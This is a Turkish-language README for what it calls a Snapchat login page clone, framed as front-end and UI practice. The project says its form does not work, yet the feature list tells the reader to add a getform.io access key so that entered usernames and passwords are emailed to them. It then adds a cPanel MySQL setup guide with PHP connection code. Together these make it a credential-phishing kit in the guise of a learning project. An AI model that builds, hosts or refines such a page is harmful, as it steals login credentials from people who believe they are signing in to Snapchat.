![faviconV2](https://github.com/user-attachments/assets/be9f2799-650a-4e93-bee4-4a0a6117fd36)
# Snapchat Giriş Sayfası Klonu 2025 (En Son)

HTML, CSS ve JavaScript kullanılarak oluşturulmuş, Snapchat'in giriş ekranının duyarlı (responsive) bir kopyası. Bu proje, ön yüz uygulamaları için pratik yapma ve UI/UX tasarımını sergileme amacıyla tasarlanmıştır.

---

## 📖 Özellikler

- 🎨 **Duyarlı Tasarım**: Mobil ekranlar için optimize edilmiştir.
- 💻 **Temiz Düzen**: Snapchat'in resmi giriş sayfasını taklit eder.
- 🔒 **Sahte Giriş Formu**: E-posta ve şifre alanları içerir (işlevsel değildir).  
  *Kullanıcı adı ve şifreyi e-posta yoluyla almak için form action'ına getform.io'dan edindiğiniz erişim anahtarını ekleyin.*

---

## 🔧 Teknik Yığın

- **HTML5**: Sayfa yapısı için.
- **CSS3**: Stil ve duyarlı tasarım için.
- **JavaScript**: Ek etkileşimler için.

---

## 🚀 Başlangıç

Projeyi yerel olarak görüntülemek için aşağıdaki adımları izleyin:

1. **Depoyu Klonlayın:**

   ```bash
   git clone https://github.com/tejazmali/snapchat-login-clone.git
   ```

2. **Proje Klasörüne Geçin:**

   ```bash
   cd snapchat-login-clone
   ```

3. **`index.html` Dosyasını Tarayıcınızda Açın:**

   ```bash
   open index.html
   ```

---

## 📸 Ekran Görüntüleri

![Örnek Ekran Görüntüsü](https://github.com/user-attachments/assets/6f5ba543-e01d-42ae-a604-a7a1d1ac4bf4)

---

## 🛠️ Özelleştirme

- Snapchat logosunu kendi marka logonuz ile değiştirin.
- CSS dosyasındaki stilleri düzenleyerek renk, yazı tipi veya düzeni değiştirebilirsiniz.
- Giriş formuna bir backend servisi ekleyerek işlevsellik kazandırabilirsiniz.

---

## 🤝 Katkıda Bulunma

Katkılarınız memnuniyetle karşılanır! Katkıda bulunmak için:

1. Depoyu çatallayın (fork).
2. Yeni bir dal oluşturun:
   ```bash
   git checkout -b feature-name
   ```
3. Değişikliklerinizi kaydedin:
   ```bash
   git commit -m 'Özellik ekle: feature-name'
   ```
4. Dala gönderin:
   ```bash
   git push origin feature-name
   ```
5. Bir pull request gönderin.

---

## 🛣️ cPanel için SQL Bağlantısı Yol Haritası

cPanel üzerinden SQL veritabanına bağlantı kurmak için aşağıdaki adımları takip edebilirsiniz:

1. **cPanel’e Giriş Yapın:**  
   cPanel giriş bilgilerinizi kullanarak hesabınıza erişin.

2. **MySQL Veritabanları Bölümüne Gidin:**  
   cPanel ana sayfasında "MySQL Databases" seçeneğini bulun ve tıklayın.

3. **Yeni Bir Veritabanı Oluşturun:**  
   İlgili alana veritabanı adını girerek yeni bir veritabanı oluşturun.

4. **Yeni Bir MySQL Kullanıcısı Oluşturun:**  
   - MySQL kullanıcıları bölümünde yeni bir kullanıcı oluşturun.
   - Bir şifre belirleyin ve bu şifreyi güvenli bir yerde saklayın.

5. **Kullanıcıyı Veritabanına Ekleyin:**  
   Oluşturduğunuz kullanıcıyı, oluşturduğunuz veritabanına ekleyin ve gerekli tüm izinleri (ALL PRIVILEGES) verin.

6. **Bağlantı Detaylarını Not Edin:**  
   Bağlantı için gerekli olan bilgiler:
   - **Veritabanı Sunucusu:** Genellikle `localhost`.
   - **Veritabanı Adı:** Oluşturduğunuz veritabanının adı.
   - **Kullanıcı Adı:** Oluşturduğunuz MySQL kullanıcısının adı.
   - **Şifre:** Kullanıcı için belirlediğiniz şifre.

7. **Web Uygulamanızda Bağlantıyı Ayarlayın:**  
   Örneğin, PHP kullanıyorsanız bir `config.php` veya `db.php` dosyası oluşturun ve aşağıdaki örnek kodu kendi bilgilerinize göre düzenleyin:

   ```php
   <?php
   $servername = "localhost";
   $username = "kullanici_adi";
   $password = "sifre";
   $dbname = "veritabani_adi";

   // Bağlantıyı oluştur
   $conn = new mysqli($servername, $username, $password, $dbname);

   // Bağlantıyı kontrol et
   if ($conn->connect_error) {
       die("Bağlantı hatası: " . $conn->connect_error);
   }
   echo "Bağlantı başarılı!";
   ?>
   ```

8. **Bağlantıyı Test Edin:**  
   Web uygulamanızı çalıştırarak veritabanı bağlantısının doğru yapılandırıldığını test edin.

Bu adımları takip ederek cPanel üzerinden SQL veritabanınıza sorunsuz bir şekilde bağlantı kurabilirsiniz.
